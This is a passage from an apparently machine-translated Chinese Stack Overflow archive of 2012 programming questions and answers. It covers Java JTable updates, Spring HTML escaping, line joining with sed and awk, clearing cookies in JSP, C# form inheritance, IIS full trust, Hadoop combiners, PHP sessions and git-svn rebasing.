                            SQLCommands.SQLCommand("UPDATE "+tableName+" SET "+columnNames[j]+"='"+data[i][j]+"' WHERE recID="+i);
                        }
                    }
                }
            }

        }

    }

    private void printTable(String[][] t){
        for(String[] a : t){
            for(String b: a){
                System.out.print(b+" ");
            }
            System.out.println();
        }
    }

    public static void main(String[] args){
        String [] tableNames = SQLCommands.returnSQLCommand("SELECT name FROM sqlite_master");
        new ViewTable(tableNames[tableNames.length -1]);
    }

} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-19T01:32:15.127

你应该使用`TableModel`. 查看[如何使用表格](http://docs.oracle.com/javase/tutorial/uiswing/components/table.html#data)。然后[fireTableDataChanged()](http://docs.oracle.com/javase/6/docs/api/javax/swing/table/AbstractTableModel.html#fireTableDataChanged%28%29)（或其他适当的 fire* 方法）将通知您的表有关更改。

也许[使用带有 GUI API 的 JDBC](http://docs.oracle.com/javase/tutorial/jdbc/basics/jdbcswing.html)会有所帮助。它演示了 JDBC 和 JTable 的非常基本的集成。

# spring - Stringbuilder在spring mvc中追加换行符

> ID：10220340
> 
> 赞同：1
> 
> 时间：2012-04-19T01:15:37.293
> 
> 标签：spring, spring-mvc, spring-roo

我还在学习 Spring Roo，所以请多多包涵。这是我所拥有的（由 roo 生成）

```
public String convert(Cluster cluster) {
        return new StringBuilder().append(cluster.getName()).toString();
    } 
```

所以产生的就是这个。

```
<div id="_s_com_clusters_id" class="box">Cluster1,Cluster2,Cluster3,Cluster4,Cluster5,Cluster6</div> 
```

显示哪个

集群 1、集群 2、集群 3、集群 4、集群 5、集群 6

到网页。

我想要做的是插入一个新行而不是 "," 我尝试了 append("\n") 并且在每个行之间添加了一个空格，但就是这样。

编辑：我也尝试过 append("
") 并且生成的 html 是

```
<div id="_s_com_clusters_id" class="box">Cluster1&lt;br/&gt;,Cluster2&lt;br/&gt;,Cluster3&lt;br/&gt;,Cluster4&‌​lt;br/&gt;,Cluster5&lt;br/&gt;,Cluster6&lt;br/&gt;</div> 
```

这导致

集群1<br/>,集群2<br/>,集群3<br/>,集群4&‌​lt;br/>,集群5<br/>,集群6<br/>

正在网页上显示。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-20T12:50:47.890

您的 spring 配置可能会转义 HTML 代码。检查是否有类似的东西：

```
<context-param>
    <param-name>defaultHtmlEscape</param-name>
    <param-value>true</param-value>
</context-param> 
```

在您的 web.xml 文件中

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T01:17:50.737

试试这个，应该没问题：

```
append("<br/>"); 
```

# flash - 从 jsf 页面加载 flex swf 应用程序

> ID：10220347
> 
> 赞同：1
> 
> 时间：2012-04-19T01:16:04.367
> 
> 标签：flash, apache-flex, jsf, swfobject

我正在开发一个应该在其上嵌入 Flex swf 对象的 JSF 应用程序，但是我无法成功地做到这一点。我现在正在做的是使用 Primefaces commandButton，它在 click 事件上执行 javascript 函数：

我使用的代码如下：

```
<ui:define name="contentPreview">
    <div style="width: 100%;height: 400px;border: 1px solid;">

    <p:commandButton value="Vista Previa Tour" 
                     process="@this"
                     onclick="loadFlexVirtualTour();"
                      style="float:left;"/>

    <h:panelGroup layout="block" id="flashContent" rendered="true">
               <p>
            To view this page ensure that Adobe Flash Player version 
            11.1.0 or greater is installed. 
        </p>

    </h:panelGroup>

    </div>
</ui:define> 
```

以及用于加载 swf 对象的脚本：

```
<script type="text/javascript">

        function loadFlexVirtualTour(){
        alert(UrlExists("virtualTour.swf"))
        // For version detection, set to min. required Flash Player version, or 0 (or 0.0.0), for no version detection. 
        var swfVersionStr = "10.0.0";
        // To use express install, set to playerProductInstall.swf, otherwise the empty string. 
        swfobject.embedSWF("virtualTour.swf", "flashContent", "400", "400", swfVersionStr);

        // JavaScript enabled so display the flashContent div in case it is not replaced with a swf object.
        swfobject.createCSS("#flashContent", "display:block;text-align:left;");
        }

        function UrlExists(url)
        {
            var http = new XMLHttpRequest();
            http.open('HEAD', url, false);
            http.send();
            return http.status!=404;
        }
    </script> 
```

UrlExists 是一个检查给定 URL 上是否存在资源的函数，在这种情况下，我正在检查 virtualTour.swf 是否与 jsf 页面位于同一目录中。

该函数执行正确，因为我可以在屏幕上看到警报，甚至 URLExists 函数也返回 true。但是，应用程序未加载。我做错了什么...

PD：标签只生成一个 html 元素，特别是在这种情况下，渲染 html 将是

```
 <button id="j_idt43" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" type="submit" style="float:left;" onclick="loadFlexVirtualTour();;PrimeFaces.ab({formId:'j_idt8',source:'j_idt43',process:'j_idt43'});return false;" name="j_idt43" role="button" aria-disabled="false"> 
```

# linux - 使用 Perl / AWK 将两行连续合并为一行

> ID：10220348
> 
> 赞同：4
> 
> 时间：2012-04-19T01:16:35.603
> 
> 标签：linux, perl, unix, text, awk

我有如下数据：

```
abcd
join abcd
efgh
join efgh 
```

我想将两个连续的对连接成一条线。结果：

```
abcd join abcd
efgh join efgh 
```

我怎样才能在 Perl/AWK 中做到这一点？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-04-19T01:23:05.440

```
$ sed 'N;s/\n/ /' input.txt
abcd join abcd
efgh join efgh 
```

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-04-19T01:49:28.197

最简单的方法是：

```
paste - - < FILE 
```

这使用空格而不是制表符连接：

```
paste -d" " - - < FILE 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-19T02:32:45.393

珀尔：

```
perl -pe's/\n/ / if $. % 2' file 
```

* * *

高尔夫挑战：将上述内容缩短 5 个字符。

高尔夫挑战解决方案：

```
perl -pe'$.%2&&s/
/ /' file 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2015-04-10T23:50:00.987

```
cat input | paste -sd' \n' 
```

如果给出列表，则粘贴在分隔符之间交替。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-04-19T01:22:51.947

我的第一直觉：

```
perl -lne 'if ($. % 2) { $last = $_; } else { print "$last $_" }' 
```

受@kev 的 sed 解决方案启发的更简洁的版本：

```
perl -lpe '$_ .= " " . <>; chomp' 
```

但我认为 sed 赢得了这一轮。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2012-04-19T08:21:53.020

```
awk '{getline a; printf "%-s\n", $0 " " a}' file 
```

# jsp - 使用 JSP 清除所有设置的 cookie

> ID：10220353
> 
> 赞同：1
> 
> 时间：2012-04-19T01:17:11.283
> 
> 标签：jsp, cookies

我想创建一个 JSP 来删除适用于当前页面的所有 cookie（因此，如果重置页面驻留在站点上是 www.dev.example.com，它将获取所有 cookie: `www.dev.example.com`, `.dev.example.com`, . `example.com`）和服务器端，将它们全部删除。

这个代码是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T01:24:13.573

参考[RFC 2109](http://www.ietf.org/rfc/rfc2109.txt)，你只需要在你的 HTTP 响应中使用 Set-Cookie 标头，并将你想要清除的 cookie 设置为空值。比如

```
Set-Cookie: ssid= 
```

更新：我不熟悉 JSP，所以我使用 PHP 和 Javascript 例如，假设您的 cookie 中没有[HttpOnly](https://www.owasp.org/index.php/HttpOnly)属性。

我使用此 PHP 代码设置 cookie，您可以将此 PHP 脚本上传到您的 Web 服务器 www.yourserver.com/setcookie.php

```
<?php
setcookie('name', 'li');
?> 
```

我使用[此](https://stackoverflow.com/questions/179355/clearing-all-cookies-with-javascript)HTML 文件清除您的 cookie，再次将此 HTML 文件上传到您的网络服务器 www.yourserver.com/clearcookie.html

```
<script>
function deleteAllCookies() {
    var cookies = document.cookie.split(";");

    for (var i = 0; i < cookies.length; i++) {
        var cookie = cookies[i];
        var eqPos = cookie.indexOf("=");
        var name = eqPos > -1 ? cookie.substr(0, eqPos) : cookie;
        document.cookie = name + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
    }
}

deleteAllCookies();
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T01:37:36.560

如果您不想删除，那么另一种选择是将它们存储为持久 cookie

```
set MaxAge = -1 
```

MaxAge 为 -1 表示您希望 cookie 在会话期间持续存在。您想将 MaxAge 设置为 0。

```
 A negative value means that the cookie is not stored persistently and 
will be deleted when the Web browser exits. A zero value causes the cookie
to be deleted. 
```

另一个是

```
Iterate all cookies in servlet/Scriptlet and set all Cookies Value NULL . 
```

还有一个是

```
use javascript code to remove all cookies. 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-20T10:46:44.063

使用以下代码。

```
<body>

<%

    if(request.getParameter("removeCookie") != null){           
        for(Cookie cookie : request.getCookies()){

            if(!cookie.getName().equals("JSESSIONID")){
                cookie.setMaxAge(0);
                cookie.setValue("");
                cookie.setPath("/");

                response.addCookie(cookie);
            }
        }
    }

%>
<form action="#" method="get">

<input type="submit" id="removeCookie" name="removeCookie" value="Remove cookie" >
</form>

</body> 
```

# google-app-engine - 使用 Async UrlFetch 在 App Engine 上提取网页字符码

> ID：10220355
> 
> 赞同：0
> 
> 时间：2012-04-19T01:17:27.333
> 
> 标签：google-app-engine, urlfetch

关于确定文本文件和网页的字符编码的讨论很多。

对于网页，似乎最好/最简单的方法是使用一个库，该库将 Url 作为输入并返回正确编码的字符串。由于库正在获取文档，因此它可以使用 HTTP 标头来帮助确定编码。

1.  [http://htmlcleaner.sourceforge.net/download](http://htmlcleaner.sourceforge.net/download)。
2.  [你如何以编程方式在 Java 中下载网页](https://stackoverflow.com/questions/238547/how-do-you-programmatically-download-a-webpage-in-java)
3.  [使用java在网页中进行字符编码](https://stackoverflow.com/questions/5077630/character-encoding-in-a-web-page-using-java)
4.  [http://docs.oracle.com/javase/6/docs/technotes/guides/intl/encoding.doc.html](http://docs.oracle.com/javase/6/docs/technotes/guides/intl/encoding.doc.html)

如果我们想使用 UrlFetch 获取文档，特别是异步 api，最好的方法是什么，库？用于确定编码。

是否有任何库与异步 urlfetch 集成（或可以轻松修改以集成）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-19T09:45:07.317

`URLFetch`您将获得一个`HTTPResponse`可以使用的位置，[`getHeaders()`](https://developers.google.com/appengine/docs/java/javadoc/com/google/appengine/api/urlfetch/HTTPResponse#getHeaders%28%29)以获取[标题列表。](http://en.wikipedia.org/wiki/List_of_HTTP_header_fields#Responses)查找`Content-Type`，对于网页，它应该类似于`text/html; charset=UTF-8`，`charset`您的字符集编码在哪里。

# c# - C# 继承窗体中的类

> ID：10220358
> 
> 赞同：3
> 
> 时间：2012-04-19T01:17:31.730
> 
> 标签：c#, inheritance

我已经把头发拉了一段时间

我创建了一个充满图片框的表单。每个图片框将包含一个_click、_mousedown 和_mouseup 事件。我希望将这些为表单创建的事件移动到 class1.cs 中，然后让 form1.cs 继承这些事件。

我不想公开picturebox1。所以诸如 Class1 classOne = new Class1(); pictureBox1.Click += new EventHandler(cs.pictureBox1_Click); 不管用。

我不确定如何让 form1.cs 继承 class1.cs。在我的脑海里听起来很容易，但我只是在精神空白

我已经厌倦了 Form1 类：Form, Class1

在 Form1.Designer.cs 中 this.pictureBox1.Click += new System.EventHandler(this.pictureBox1_Click); this.pictureBox1_Click 无法访问

如果你能指出我正确的方向，那将是一个很大的帮助！干杯

```
Form1.cs
public partial class Form1 : Form
{
    public Form1()
    {
        InitializeComponent();
    }
}

Class1.cs 
class Class1
{

    private void pictureBox1_Click(object sender, EventArgs e)
    {
        MessageBox.Show("pb1 click");
    }
 } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T01:24:24.693

继承定义了“is-a”关系，因此除非 Form1*是*Class1，否则您没有以正确的方式处理此问题。根据您要设计的内容，您确实有几个选择：

1.  通过公共方法将表单传递给类实例，并让类附加事件处理程序（如果有多个共享行为的表单，这在这些情况下似乎更有意义）。

2.  将常见行为存储在表单本身中（作为一种特殊类型的表单，`PictureClickingForm`），然后让其他表单继承。现在可以保护方法。

这是一个继承与包容的问题。当以这种方式表达问题时，有关此的更多信息。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-19T01:24:16.293

`Class1`应该继承自`Form`，然后`Form1`将继承自`Class1`：

```
class Class1 : Form
{
    //...
}

public partial class Form1 : Class1
{
    //...
} 
```

确保所有`partial`声明都继承自`Class1`而不是继承自`Form`. （这可能会为任何自动生成的代码添加一个额外的步骤，这是类的经典原因`partial`。您可能需要为此编写自己的自动化。）

我不清楚的是你试图通过在`Form`and之间使用中间类型来实现什么`Form1`。应该是`Class1`多个表单将继承的通用“基本表单”吗？或者你正在尝试做其他事情？但是，如果您希望`Form1`能够访问成员`Class1`而不将其公开为`public`成员，则可以`protected`改为创建它们。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-19T01:24:36.037

只有通过如下更改 Class1.cs 才能实现它

```
public partial class Form1
{
    private void pictureBox1_Click(object sender, EventArgs e)
    {
        MessageBox.Show("pb1 click");
    }
 } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-19T01:24:23.070

您想订阅`Form1`来自 的事件`Class1`吗？尝试这样的事情：

```
//Form1.cs
public partial class Form1 : Form
{
    Class1 class1;

    public Form1()
    {
        InitializeComponent();
        class1 = new Class1();
        this.pictureBox1.Click += new EventHandler(class1.pictureBox1_Click); 
    }
}

//Class1.cs 
class Class1
{

    private void pictureBox1_Click(object sender, EventArgs e)
    {
        MessageBox.Show("pb1 click");
    }
} 
```

看起来您尝试做的不是继承，而是简单地将 GUI 事件通知给外部对象。你应该重新评估你的代码，想想你正在尝试*做*什么。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-19T01:28:18.373

您的 Form1 是一个类，因此只需从 Form1 继承 Form2。（而不是试图将部分复制回一些新的 Class1.cs 文件）Form1.designer.cs 仍然是 Form1 定义的一部分，只是为了图形表单设计器的目的而被移到一边。但请注意，定义中没有其他部分（即使是设计师也没有！我都在里面！）。

此外，您不必公开这些类以使同一程序集内部可以访问图片框。

选项：您可以在 Form1 中创建自己的事件，也可以使用 Form2 之类的子类创建处理 Form1 事件发生的方法`abstract`。`virtual`

这有帮助吗？

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-10-01T14:57:55.497

您始终可以使用接口。关键是你只能从一个类继承，但有很多接口......所以我假设你需要这样一个接口——通过方法或其他方式传递方法。远离接口，您始终可以将您的类作为第二类 Form 的构造函数的参数（使用 'this' 关键字），这样您就可以将值、方法从以前的 Form 传递给另一个（例如事件）。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-04-19T01:22:12.703

您不需要公开图片框本身，但您需要公开 Class1 中的事件处理程序，以便可以在其他地方访问它们。

我真的看不出你应该在这里特别要求继承的理由。[在这里](http://msdn.microsoft.com/en-us/library/ms173149%28v=vs.100%29.aspx)查看更多信息。

# asp.net - 如何部署完全信任的 IIS ASP .NET 应用程序？

> ID：10220364
> 
> 赞同：4
> 
> 时间：2012-04-19T01:18:06.713
> 
> 标签：asp.net, .net, security, iis, permissions

我们有一个工业系统，可以使用提供给我们的一些 C++ DLL 进行接口。我编写了一个 .NET 包装器来控制工业系统，然后将这个 .NET 包装器捆绑到一个 ASP .NET Web 应用程序中，这样我们就可以通过 Web 控制系统。

当我使用 ASP .NET 开发服务器在 Visual Studio 中运行/调试时，一切正常。当我部署到本地 ISS 服务器时，我收到来自 C++ DLL 的错误，（有人告诉我）这意味着存在通信故障。

因为 IIS 应用程序和开发服务器在同一台机器上，一个工作而另一个不工作，我确信这是一个权限/安全错误。我花了几天时间摆弄应用程序池标识、ASP .NET 模拟、文件系统权限等，但无济于事。（我也有点 IIS-noob，这没有帮助。）

所以，这里是妙语：

有人可以解释一下如何（如果可能的话）设置一个 IIS ASP .NET 应用程序，以便它可以在对本地机器的完全（全力以赴，枪林弹雨）访问的情况下运行吗？我想确保 IIS 不会阻止应用程序的*任何事情*。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-19T01:24:52.543

我不确定提供完全信任模式是否会解决您的问题，因为错误似乎来自 C++，并且文件系统级别的某种权限丢失或文件本身丢失。

无论如何，要回答您的问题，您可以使用 web.config 设置完全信任模式，将以下部分添加到您的 web.config：

```
<system.web>
 <securityPolicy>
   <trustLevel name="Full" policyFile="internal"/>
 </securityPolicy>
</system.web> 
```

更多细节可以在这里看到：http: [//msdn.microsoft.com/en-us/library/wyts434y.aspx](http://msdn.microsoft.com/en-us/library/wyts434y.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T04:09:21.197

除了在 ASP.NET 应用程序本身中设置完全信任级别，检查 IIS 用于匿名访问您的网站/Web 应用程序的用户：

Web 应用程序 -> 属性 -> 目录安全 -> 编辑（在身份验证和访问控制中）。

（此路径适用于 IIS6。）

默认情况下，IIS 为用户分配了缩减权限，这可能会导致您遇到问题。

# c# - 使用 Silverlight 为动态数据创建自定义转换器

> ID：10220370
> 
> 赞同：1
> 
> 时间：2012-04-19T01:19:09.723
> 
> 标签：c#, silverlight, xaml, ivalueconverter

我将从 WCF 天气服务接收到的数据绑定到 silverlight 中的数据网格。我得到了一个 7 天预测的回报。我遇到的问题是返回是一个集合，在这个集合中是温度和降水概率，这是另一个层次。温度有高有低，降水的概率有白天和夜间。

```
namespace MyProject
{
public partial class MainPage : UserControl
{

    WeatherSoapClient weatherClient = new WeatherSoapClient();

    public MainPage()
    {
        InitializeComponent();

        weatherClient.GetCityWeatherByZIPCompleted += new EventHandler<GetCityWeatherByZIPCompletedEventArgs>(weatherClient_GetCityWeatherByZIPCompleted);
    } 
```

这是我将数据网格的源设置为预测集合的地方。

```
 void weatherClient_GetCityForecastByZIPCompleted(object sender, GetCityForecastByZIPCompletedEventArgs e)
    {
        this.dataGrid1.ItemsSource = e.Result.ForecastResult;

    }

    private void button1_Click(object sender, RoutedEventArgs e)
    {
        weatherClient.GetCityForecastByZIPAsync(inputZip.Text);
    }
}
} 
```

我在数据网格中得到的结果如下所示：http: [//i.stack.imgur.com/9W67v.jpg](http://i.stack.imgur.com/9W67v.jpg)

正如您在温度和 POP 下看到的，这不是我想要显示的。作为 C# 的新手，我很难达到我现在的目的。现在有人建议制作一个自定义转换器以深入挖掘。我不确定如何做到这一点。任何帮助将不胜感激。希望我能展示你需要看到的一切。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T01:52:38.297

您需要在数据网格上设置`AutoGenerateColumns`为`False`，然后自己定义列类型（有关如何在 Internet 上执行此操作的大量信息）。

对于前几列，`DataGridTextColumn`很好。

对于最后两个，您想使用`DataGridTemplateColumn`. 在`DataTemplate`for 列中，您可以放置​​两个 TextBlock，每个绑定到不同的属性。

例如：

```
<data:DataGrid AutoGenerateColumns="False">
    <data:DataGrid.Columns>

      <data:DataGridTextColumn Header="Date"
                               Binding="{Binding Date}" />

      <data:DataGridTextColumn Header="ID"
                               Binding="{Binding WeatherID}" />

      <data:DataGridTemplateColumn Header="Temperature">
        <data:DataGridTemplateColumn.CellTemplate>
          <DataTemplate>
             <StackPanel>
               <TextBlock Text="{Binding Temperatures.High}" />
               <TextBlock Text="{Binding Temperatures.Low}" />
             </StackPanel>
          </DataTemplate>
        </data:DataGridTemplateColumn.CellTemplate>
      </data:DataGridTemplateColumn>
    </data:DataGrid.Columns>
</data:DataGrid> 
```

# hadoop - mapreduce 作业中的“Combiner”类

> ID：10220371
> 
> 赞同：17
> 
> 时间：2012-04-19T01:19:21.857
> 
> 标签：hadoop, mapreduce, reducers, combiners

Combiner 在 Mapper 之后和 Reducer 之前运行，它将接收给定节点上 Mapper 实例发出的所有数据作为输入。然后向 Reducers 发出输出。

此外，如果 reduce 函数既可***交换又可关联***，那么它可以用作组合器。

***我的问题是在这种情况下“交换和联想***”这个词是什么意思？

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-04-19T01:39:13.753

假设你有一个数字列表，1 2 3 4 5 6。

这里的关联意味着您可以进行操作并将其应用于任何子组，然后将其应用于这些结果并得到相同的答案：

```
(1) + (2 + 3) + (4 + 5 + 6)
  ==
(1 + 2) + (3 + 4) + (5) + (6)
  ==
... 
```

将此处的括号视为组合器的执行。

可交换意味着顺序无关紧要，所以：

```
1 + 2 + 3 + 4 + 5 + 6
  ==
2 + 4 + 6 + 1 + 2 + 3
  ==
... 
```

例如，如前所述，加法适合此属性。“最大值”也适合上面的这个属性，因为 maxs 的最大值就是最大值。最大值（a，b）== 最大值（b，a）。

中位数是一个不起作用的例子：中位数的中位数不是真正的中位数。

* * *

不要忘记组合器的另一个重要属性：键/值的输入类型和键/值的输出类型需要相同。例如，您不能接受 string:int 并返回 string:float。

通常，reducer 可能会输出某种字符串而不是数值，这可能会阻止您将 reducer 作为组合器插入。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2012-04-19T01:38:20.053

对于交换性，假设您的 reducer 可以用一个名为 f() 的函数（在数学术语中）表示。那么如果 f(a, b) = f(b, a) 你的 reducer 是可交换的，例如：

*   sum(A, B) 与 sum(B, A) 相同
*   xor(A, B) 与 xor(B, A) 相同
*   concat(A, B)**与**concat(B, A) 不同

对于关联性，属性是 f(f(a, b), c) = f(a, f(b, c))。例如：

*   (A + B) + C 与 A + (B + C) 相同
*   (A - B) - C**与**A - (B - C) 不同

所以在 Map/Reduce 的上下文中，你的 reducer 必须尊重这两个属性。例如，如果你的 reducer 只做 sum() 或 max()，它会尊重这两个属性，但像 mean() 或 median() 这样的东西不会，因此你不能将它用作组合器。

我个人认为组合器是在映射阶段之后在内存中运行的小型缩减器，作为减少网络流量的优化，如果您以这种方式看到映射/缩减，交换性/关联性实际上是有意义的：

![在此处输入图像描述](../Images/f637587c2a547c76a3b01cebe44e6ab4.png)

# php - PHP 会话变量和 jQuery

> ID：10220372
> 
> 赞同：1
> 
> 时间：2012-04-19T01:19:36.183
> 
> 标签：php, jquery, session, variables

所以，我在处理 PHP 会话变量时遇到了一些问题。我有一个 jQuery 函数可以将变量发布到 PHP 文件（工作，请参见此处的代码）：

```
 $('#practiceid').blur(function() {
    var practiceid = $(this).val();
    $.post("delicious.php", {"pid": practiceid});
   }); 
```

感谢Firebug，我可以看到delicious.php 接收了变量。现在，该 PHP 文件中的代码是：

```
$_SESSION['uploaddir'] = $_POST['pid']; 
```

现在的问题是，当我尝试在其他 PHP 文件中使用会话变量时，它似乎不存在。我已经`session_start();`在 index.php 文件中声明了。

有任何想法吗？

非常感谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-19T01:21:45.853

您是否确保在需要使用 $_SESSION 成员的*每个页面上都调用 session_start() ？*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-19T02:49:05.647

`session_start()`需要写在您使用会话值的每个页面上。

另外，不要直接为 SESSION 变量赋值。用这个 ：-

```
if(isset($SESSION['uploaddir'])){
 unset($_SESSION['uploaddir']); 
} 
$_SESSION['uploaddir'] = $_POST['pid']; 
```

您使用的作业可能会导致警告

# git-svn - 我可以 git svn rebase 到某个 svn 版本吗？（类似于 svn up -r ...）

> ID：10220374
> 
> 赞同：16
> 
> 时间：2012-04-19T01:20:12.230
> 
> 标签：git-svn, rebase

简短的问题：git-svn 相当于`svn up -r r1130`只更新到编号的提交（带有 svn 编号）是什么？

我正在使用 git-svn，因此我既可以使用 git，也可以管理团队 svn 存储库的（许多）本地分支。我有一个软件版本，我破解了它可以与特定的硬件设置一起使用。自从我上次使用它以来，svn repo 已经超越了这项工作的一个稳定的好点。我想将本地分支更新为代表稳定提交的编号修订。我可以在 svn with 中做到这一点`svn up -r r1130`，但我更喜欢 git。

我一直忘记过去我是如何做到这一点的，并且发现自己正在搜索 SO 和帮助页面试图找到最佳方法。也许我错过了一个措辞不同的问答？

在干净的树上检查旧版本很容易，但是当我在树的顶部进行提交时，“倒带头以在其上重放你的工作......”我通常喜欢的部分意味着在添加更改之前，我将前往树中的某个点！

现在，我打算`git svn rebase`然后以交互方式 rebase 以退出我不想要的提交，但我很难相信这是最好的，甚至是这样做的好方法。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-07-06T15:43:56.783

我更喜欢`rebase`，因为 git-svn 无论如何都必须在`dcommit`. 试试这个：

```
git checkout `git svn find-rev r1241`  # Go to the svn version of interest
git checkout -b master_r1241           # Create a new brach matching it
git checkout hwTesting                 # Merge previously created changes
git rebase master_r1241                # rebase on top of not quite up-to-date master branch 
```

您也可以一步完成：（总是可以使用 reflog 恢复，或者`rebase --abort`如果事情出现严重错误）。

```
git checkout hwTesting                 # Checkout feature branch
git rebase `git svn find-rev r1241`    # rebase on top of not quite up-to-date master branch 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T12:30:12.487

似乎没有办法一步到位。但是，您可以轻松找到给定 svn 修订号对应的 git commit id。试试这个：

```
git svn find-rev rN 
```

其中 N 是您想要的修订号。之后，使用 git checkout 签出历史记录中的特定点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-09T04:58:26.470

我将把它留作参考，因为接受的答案提到了它。但是，请使用单线变基选项...

* * *

这是我现在正在做的事情。这次我从 r1130（问题中提到）升级到 r1241：

```
git checkout `git svn find-rev r1241`  # Go to the svn version of interest
git checkout -b hwTesting_r1241        # Create a new brach matching it
git merge hwTesting_r1130              # Merge previously created changes 
```

这主要给了我我想要的东西，但是每次我更新它都会产生另一个分支。似乎应该有某种方法告诉 git 仅合并 master 上的提交，包括`git svn find-rev r1241`.

# wcf - 使用 MFSvcUtil.exe 为 .NET Micro Framework DPWS 创建 WCF 代理时出错 (StackOverflowException)

> ID：10220382
> 
> 赞同：0
> 
> 时间：2012-04-19T01:21:29.800
> 
> 标签：wcf, azure, wcf-client, .net-micro-framework

我正在尝试让我的设备与托管在 Azure 中的 WCF 服务一起工作，因此我按照文章*[使用 .NET Micro Framework 连接设备](http://msdn.microsoft.com/en-us/magazine/gg232761.aspx)*向我展示了如何做到这一点。

我遇到问题的地方是当我尝试运行`MFSvcUtil.exe`以生成代理代码时，我可以在设备端从[NETMF访问 WCF 服务方法。](http://en.wikipedia.org/wiki/.NET_Micro_Framework)

如果我尝试跑步

```
C:\Program Files (x86)\Microsoft .NET Micro Framework\v4.1\Tools\MFSvcUtil.exe" http://myservice.cloudapp.net/TrackingService.svc?singlewsdl /V 
```

我得到这个输出：

```
**MfSvcUtil.exe (c) Microsoft 2008
Reading WSDL file: http://myservice.cloudapp.net/TrackingService.svc?singlewsdl
Could not find schema information for the element 'HTML'.
Severity: Warning
Exception: System.Xml.Schema.XmlSchemaValidationException: Could not find schema information for the element 'HTML'.
SourceUri: http://myservice.cloudapp.net/TrackingService.svc?singlewsdl
LineNumber: 1
Position: 2
StackTrace: 

Program Error: The WSDL file is not compatible.** 
```

现在，如果我尝试使用常规 WSDL 文件运行，例如

```
MFSvcUtil.exe" http://myservice.cloudapp.net/TrackingService.svc?WSDL /V 
```

我得到这个输出，后面跟着一个`StackOverflowException`我找不到堆栈跟踪，请参阅`http://localhostr.com/file/QCEVawT/log.txt`（由于字符限制而上传）。

这是我完整的 WSDL： http: [//pastebin.com/M9KVYD0e](http://pastebin.com/M9KVYD0e)

我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T07:30:19.837

我想知道您是否使用.NET 4.5。该`singlewsdl`选项是 .NET 4.5 中的一项新功能，但默认情况下，Windows Azure 尚未安装 .NET 4.5。如果您想使用 .NET 4，请使用`?wsdl`而不是`?singlewsdl`.

此外，还请确保您具有该`useRequestHeadersForMetadataAddress`行为，否则 WSDL 可能无法按预期工作。您可以检查*[FIX：WCF WSDL 文档中的 URI 指的是不可访问的内部实例，而不是指 Windows Server 2003、Windows XP、Windows Vista 和 Windows Server 2008 中的 .NET Framework 3.0 中预期的负载平衡器以](http://support.microsoft.com/kb/971842)*获取更多信息。不过，不需要安装此修补程序，因为此功能已内置到 .NET 4 中。

# css - 嵌套百分比高度除法

> ID：10220383
> 
> 赞同：0
> 
> 时间：2012-04-19T01:21:30.963
> 
> 标签：css, html, percentage

我需要一个父 div 在它的孩子做时自动调整大小。

这两个孩子的身高是按百分比计算的。

代码：http: [//jsfiddle.net/gBWUv/2/](http://jsfiddle.net/gBWUv/2/)

如果您向父 div 添加高度，孩子会出现，但我希望它自动调整孩子的大小。这是因为孩子们的身高基于它的父母，当父母没有高度时，孩子的高度就是0。有没有办法在没有javascript的情况下完成我想要的？我有一个 javascript 解决方案，但我讨厌编码超出需要。简单是最好的。

这是完全符合我要求的不太优雅的 javascript：http: [//jsfiddle.net/gBWUv/14/](http://jsfiddle.net/gBWUv/14/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T01:34:37.073

如果父项为零并且子项的高度是父项的 60%，则它们也将为零。你可以让父母的身高100%吗？

```
#parent {
    padding: 5% 0;
    background: #000;
    overflow: hidden;
    height: 100%;
} 
```

# android - 如果在 onCreate() 之后填充，则不会调用 ListView 适配器 getView()

> ID：10220386
> 
> 赞同：3
> 
> 时间：2012-04-19T01:21:34.197
> 
> 标签：android, listview, android-asynctask

我有一个相当令人费解的问题。如果我尝试使用 AsyncTask 填充 ListView，则永远不会调用该 ListView 适配器上的 getView()。请注意，这是 Activity 启动时此 ListView 的初始数据填充。AsyncTask 是必需的，因为 ListView 是从 HTTP 填充的。

我有以下简单的布局：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:orientation="vertical"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    >
<ListView  
    android:id="@+id/transactionListView"
    android:layout_width="fill_parent" 
    android:layout_height="wrap_content"
    android:divider="#CCCCCC"
    android:dividerHeight="1px"
    />
</LinearLayout> 
```

还有一个基本的 onCreate()：

```
public void onCreate(Bundle savedInstanceState)
{
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
